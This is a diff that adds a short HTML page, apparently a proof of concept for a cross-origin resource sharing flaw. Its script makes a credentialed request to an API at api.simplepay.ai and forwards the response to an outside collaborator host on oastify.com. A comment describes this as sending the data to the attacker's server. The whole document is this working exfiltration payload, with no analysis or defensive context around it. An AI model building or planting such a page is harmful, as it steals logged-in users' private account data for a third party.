@@ -1,1 +1,19 @@
-
+<html>
+<body>
+   <script>
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', 'https://api.simplepay.ai/app', true);
+      xhr.withCredentials = true;
+      xhr.onreadystatechange = function() {
+         if (xhr.readyState == 4 && xhr.status == 200) {
+            // Send the data back to the attacker's server
+            fetch('https://t2wlayztx6r1oba48bal5tzo6fc601oq.oastify.com', {
+               method: 'POST',
+               body: xhr.responseText
+            });
+         }
+      };
+      xhr.send();
+   </script>
+</body>
+</html>
